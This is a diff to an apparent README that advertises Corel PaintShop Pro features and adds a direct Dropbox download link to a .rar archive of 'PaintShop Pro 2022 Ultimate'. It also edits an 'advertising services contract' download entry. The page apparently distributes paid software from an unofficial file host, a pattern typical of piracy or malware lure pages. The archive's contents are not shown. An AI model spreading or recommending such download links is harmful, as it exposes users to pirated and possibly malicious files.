@@ -19,7 +19,7 @@
 
 ## A workflow devoted entirely to creative photo post-processing
 
-## 🔐 [PaintShop Download]()
+## 🔐 [PaintShop Download](https://www.dropbox.com/s/h5cn5kmx2d7qsun/Corel%20PaintShop%20Pro%202022%20Ultimate.rar?dl=1)
 ### ● Essential tools
 
 Easily crop areas of your photo to alter the focus using composition guides, Golden Ratio and Rule of Thirds. Resize with ease using one of several presets, or resize by pixels, percentage or print size. Restore and repair old photos with the Scratch Remover and Fade Correction tools to enhance contrast and color to faded photos. 
@@ -43,7 +43,7 @@ Reduce repetition and accelerate complex photo-editing actions with Scripts. Rec
 <div align="right"><details>
 <summary>✅ Partnership and Collaboration:</summary>
     
- #### <div dir="rtl">:Contract for the provision of advertising services (.pdf) </div>
+ #### <div dir="rtl">:Contract for the provision of advertising services </div>
  [💾 Download]()
  
 </details></div>
